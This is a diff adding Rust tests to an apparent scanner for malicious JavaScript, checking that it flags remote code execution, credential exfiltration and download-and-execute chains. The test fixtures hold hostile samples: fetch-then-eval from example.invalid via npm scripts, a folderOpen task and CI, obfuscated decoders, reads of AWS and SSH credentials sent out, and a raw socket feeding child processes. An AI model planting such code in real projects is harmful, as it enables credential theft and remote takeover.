@@ -277,6 +277,51 @@ fn devcontainer_hook_reaches_local_script() {
 }
 
 #[test]
+fn compound_npm_vscode_argument_and_gitlab_roots_reach_scripts() {
+    let root = temporary_directory("execution-roots");
+    fs::create_dir_all(root.join(".vscode")).unwrap();
+    fs::create_dir_all(root.join("scripts")).unwrap();
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"npm run prepare && node ./scripts/npm.js","prepare":"node ./scripts/prepare.js"}}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join(".vscode/tasks.json"),
+        br#"{"tasks":[{"type":"process","command":"node","args":["./scripts/vscode.js"],"runOptions":{"runOn":"folderOpen"}}]}"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join(".gitlab-ci.yml"),
+        b"job:\n  script:\n    - node scripts/ci.js\n",
+    )
+    .unwrap();
+    fs::write(root.join("scripts/prepare.js"), b"console.log('prepare');").unwrap();
+    for file in ["npm.js", "vscode.js", "ci.js"] {
+        fs::write(
+            root.join("scripts").join(file),
+            b"async function boot() { const response = await fetch('https://example.invalid/x'); eval(await response.text()); } boot();",
+        )
+        .unwrap();
+    }
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let routes = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .map(|finding| finding["evidence"].to_string())
+        .collect::<Vec<_>>();
+    assert!(routes.iter().any(|route| route.contains("npm start")));
+    assert!(routes.iter().any(|route| route.contains("folderOpen")));
+    assert!(routes.iter().any(|route| route.contains(".gitlab-ci.yml")));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn benign_minified_bundle_does_not_become_critical() {
     let root = temporary_directory("minified-benign");
     let source = format!(
@@ -400,6 +445,34 @@ fn unimported_fake_asset_is_not_elevated() {
 }
 
 #[test]
+fn flow_analysis_ignores_modules_outside_known_execution_roots() {
+    let root = temporary_directory("unreachable-flow");
+    fs::write(
+        root.join("package.json"),
+        br#"{"scripts":{"start":"node entry.js"}}"#,
+    )
+    .unwrap();
+    fs::write(root.join("entry.js"), b"console.log('started');").unwrap();
+    fs::write(
+        root.join("unused.js"),
+        b"const response = fetch('https://example.invalid/control'); eval(response);",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn uncalled_function_in_imported_asset_is_not_critical() {
     let root = temporary_directory("uncalled-function");
     fs::write(root.join("tailwind.config.js"), b"require('./fake.svg');").unwrap();
@@ -510,6 +583,29 @@ fn cross_file_response_decode_reaches_computed_function() {
     assert!(evidence.contains("unpack"));
     assert!(evidence.contains("decode"));
     assert!(evidence.contains("Function"));
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn remote_data_survives_a_simple_character_xor_decoder() {
+    let root = temporary_directory("xor-decoder");
+    fs::write(
+        root.join("main.js"),
+        b"async function boot() { const response = await Promise.resolve(fetch('https://example.invalid/x')); const source = (await response.text()).split('').map(ch => String.fromCharCode(ch.charCodeAt(0) ^ 23)).join(''); Function(source)(); } boot();",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("decode"))
+    );
     fs::remove_dir_all(root).unwrap();
 }
 
@@ -634,6 +730,63 @@ fn default_exported_function_preserves_remote_data() {
 }
 
 #[test]
+fn esm_star_reexport_preserves_remote_data_through_function_expression() {
+    let root = temporary_directory("esm-star-reexport");
+    fs::write(
+        root.join("api.js"),
+        b"export const unpack = function(x) { return Buffer.from(x, 'base64').toString(); };",
+    )
+    .unwrap();
+    fs::write(root.join("bridge.js"), b"export * from './api.js';").unwrap();
+    fs::write(root.join("main.js"), b"import { unpack } from './bridge.js'; async function boot() { const response = await fetch('https://example.invalid/x'); Function(unpack(await response.text()))(); } boot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
+                && finding["evidence"].to_string().contains("api.js"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn commonjs_member_and_default_exports_preserve_remote_data() {
+    let root = temporary_directory("commonjs-exports");
+    fs::write(
+        root.join("named.js"),
+        b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } exports.unpack = unpack;",
+    )
+    .unwrap();
+    fs::write(
+        root.join("default.js"),
+        b"module.exports = function unpack(x) { return Buffer.from(x, 'base64').toString(); };",
+    )
+    .unwrap();
+    fs::write(root.join("main.js"), b"const { unpack } = require('./named.js');\nconst defaultUnpack = require('./default.js');\nasync function boot() {\n const response = await fetch('https://example.invalid/x');\n Function(unpack(await response.text()))();\n Function(defaultUnpack(await response.text()))();\n}\nboot();").unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+            .count(),
+        2,
+        "{}",
+        report["findings"]
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn static_eval_does_not_form_remote_execution_chain() {
     let root = temporary_directory("static-eval");
     fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();
@@ -689,6 +842,29 @@ fn home_relative_credential_file_reaches_outbound_request() {
             .unwrap()
             .iter()
             .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn callback_and_stream_credential_reads_reach_http() {
+    let root = temporary_directory("credential-read-forms");
+    fs::write(
+        root.join("main.js"),
+        b"const fs = require('fs');\nfs.readFile('/home/user/.aws/credentials', (error, contents) => fetch('https://example.invalid/a', { body: contents }));\nconst stream = fs.createReadStream('/home/user/.ssh/id_rsa');\nfetch('https://example.invalid/b', { body: stream });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = report["findings"].as_array().unwrap();
+    assert_eq!(
+        findings
+            .iter()
+            .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
+            .count(),
+        2
     );
     fs::remove_dir_all(root).unwrap();
 }
@@ -765,6 +941,109 @@ fn node_https_data_callback_reaches_dynamic_execution() {
             .iter()
             .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                 && finding["evidence"].to_string().contains("https.get"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn promise_function_callbacks_and_static_template_sink_are_traced() {
+    let root = temporary_directory("function-callback");
+    fs::write(
+        root.join("main.js"),
+        b"import fetch from 'node-fetch'; fetch('https://example.invalid/control').then(function(response) { return response.text(); }).then(function(payload) { globalThis[`Fun` + `ction`](payload)(); });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn socket_io_secret_emission_and_raw_socket_input_are_traced() {
+    let root = temporary_directory("socket-io");
+    fs::write(
+        root.join("exfil.js"),
+        b"import { io } from 'socket.io-client'; const socket = io('https://example.invalid'); socket.emit('config', process.env.TOKEN);",
+    )
+    .unwrap();
+    fs::write(
+        root.join("control.js"),
+        b"const net = require('net'); const cp = require('node:child_process'); const socket = net.connect(4444, 'example.invalid'); socket.on('data', function(data) { cp.execFile('node', [data]); });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
+                && finding["evidence"].to_string().contains("socket.io.emit"))
+    );
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION"
+                && finding["evidence"].to_string().contains("net.connect"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn home_directory_data_reaches_dns_lookup() {
+    let root = temporary_directory("home-dns");
+    fs::write(
+        root.join("main.js"),
+        b"const os = require('os'); const dns = require('dns'); dns.lookup(os.homedir(), () => {});",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
+                && finding["evidence"].to_string().contains("os.homedir"))
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
+fn streamed_remote_file_is_correlated_with_process_execution() {
+    let root = temporary_directory("stream-write");
+    fs::write(
+        root.join("main.js"),
+        b"const https = require('https'); const fs = require('fs'); const cp = require('child_process'); https.get('https://example.invalid/payload', response => { response.pipe(fs.createWriteStream('/tmp/payload')); cp.spawn('/tmp/payload'); });",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
     );
     fs::remove_dir_all(root).unwrap();
 }
